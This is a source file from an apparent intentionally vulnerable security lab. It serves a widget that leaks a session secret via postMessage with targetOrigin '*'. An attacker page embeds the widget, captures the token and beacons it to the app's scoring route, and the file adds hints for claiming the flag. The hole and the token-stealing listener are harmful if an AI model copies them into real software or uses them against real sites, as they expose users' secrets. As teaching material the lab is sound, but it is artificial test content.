'use strict';
// Lab 2: the trusted widget posts its secret token to the parent frame with
// targetOrigin '*', so any embedding page receives it. The flag beacon (a
// shared module-level route) only awards when the payload carries the real
// per-session secret.
const express = require('express');
const crypto = require('crypto');
const { page } = require('../../../lib/page');

const router = express.Router();

// "How to claim this flag" card with the live claim-status widget. The steps
// describe the postMessage lab flow (the victim page broadcasts the secret and
// the attacker page's listener fires the beacon); the widget markup matches
// the global poller in public/app.js.
function claimCard(vulnId, steps) {
  const id = String(vulnId).replace(/[^a-z0-9-]/gi, '');
  const items = steps.map((s) => `<li>${s}</li>`).join('');
  return `<div class="card claim-box">
    <div class="card-top"><b>How to claim this flag</b></div>
    <ol>${items}</ol>
    <p id="claim-status-${id}" class="status status-missing" role="status" data-status-url="/postmsg/claim-status?v=${id}"><span class="dot" aria-hidden="true"></span><span class="claim-text">Checking claim status...</span></p>
  </div>`;
}

// GET /postmsg/wildcard -> victim widget that broadcasts its secret token.
router.get('/wildcard', (req, res) => {
  if (!req.session.pm_secret) req.session.pm_secret = crypto.randomBytes(16).toString('hex');
  const secret = req.session.pm_secret;
  res.send(page('Widget (wildcard postMessage)', `
    <h2>Trusted widget</h2>
    <p>This widget shares a secret token with the page that embeds it.</p>
    <div class="card">
      <div class="card-top"><b>Widget status</b></div>
      <div id="out" class="dim">(waiting for page load...)</div>
    </div>
    <script>
      var SECRET_TOKEN = ${JSON.stringify(secret)};
      window.addEventListener('load', function () {
        // VULN: sensitive data posted with targetOrigin '*', so ANY embedding
        // page - including an attacker's - receives the secret.
        parent.postMessage({ token: SECRET_TOKEN, from: 'trusted-widget' }, '*');
        document.getElementById('out').textContent = 'Token shared with parent frame.';
      });
    </script>
    <p class="note">Attacker page: <a class="clay-btn clay-btn-secondary clay-btn-sm" href="/postmsg/wildcard/attacker">open it</a>; it embeds this
    widget and listens for the token.</p>
  `));
});

// GET /postmsg/wildcard/attacker -> evil page that captures the broadcast token.
router.get('/wildcard/attacker', (req, res) => {
  res.send(page('Attacker: wildcard targetOrigin', `
    <h2>Attacker page (lab 2)</h2>
    <p>An evil page embedding the victim widget. Because the widget uses
    <code>postMessage(data, '*')</code>, the token lands here.</p>
    <div class="card">
      <div class="card-top"><b>Victim widget (embedded)</b></div>
      <iframe id="v" src="/postmsg/wildcard" width="100%" height="220" style="border:0; border-radius:1rem;" title="victim widget"></iframe>
    </div>
    <div class="card">
      <div class="card-top"><b>Captured token</b></div>
      <p><code id="got">(waiting...)</code></p>
    </div>
    <script>
      window.addEventListener('message', function (e) {
        if (e.data && e.data.token) {
          document.getElementById('got').textContent = e.data.token;
          fetch('/postmsg/beacon?v=wildcard&d=' + encodeURIComponent('wildcard:' + e.data.token));
        }
      });
    </script>
    ${claimCard('wildcard', [
      'Just open this page. The victim widget broadcasts its secret with targetOrigin <code>*</code>, so it lands here.',
      'The listener above captures the token and fires the beacon with it.',
      'The widget below polls for confirmation; once it flips, the flag is on your scoreboard.',
    ])}
  `));
});

module.exports = {
  vuln: {
    id: 'wildcard',
    name: 'Secret Leaked via Wildcard targetOrigin',
    difficulty: 'Easy',
    hint: 'The widget posts its secret token to parent with targetOrigin "*". Embed it in the attacker page and just listen.',
    hints: [
      "The victim broadcasts the secret with targetOrigin '*'. Who can receive it?",
      "Anyone who embeds the victim. The '*' means no restriction.",
      'Embed the victim in your attacker page and listen for the message. The secret arrives.',
    ],
    tools: 'B, DT',
    how: 'Open the attacker page; it captures the token the widget broadcasts and beacons it.',
    link: '/postmsg#wildcard',
    start: 'curl -s http://localhost:3000/postmsg/wildcard | grep -n "postMessage"',
  },
  router,
};
